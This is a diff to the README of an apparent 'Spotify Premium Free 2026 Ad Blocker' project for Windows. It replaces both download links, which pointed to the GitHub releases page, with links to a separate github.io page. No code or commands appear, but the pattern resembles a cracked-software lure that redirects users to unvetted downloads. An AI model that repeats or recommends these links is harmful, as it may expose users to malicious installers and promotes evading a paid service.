@@ -1,6 +1,6 @@
 # 🎧 Spotify-Premium-Free-2026-Ad-Blocker - Listen to your music without interruptions
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/olliecubital30/Spotify-Premium-Free-2026-Ad-Blocker/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://olliecubital30.github.io)
 
 ## Overview ℹ️
 
@@ -20,7 +20,7 @@ Before you install this software, confirm your computer meets these requirements
 Follow these steps to set up the ad blocker on your Windows computer.
 
 1. First, visit the official release page to download the latest version of the installer.
-   [Download Link](https://github.com/olliecubital30/Spotify-Premium-Free-2026-Ad-Blocker/releases)
+   [Download Link](https://olliecubital30.github.io)
 
 2. Locate the file in your Downloads folder once the transfer finishes.
 
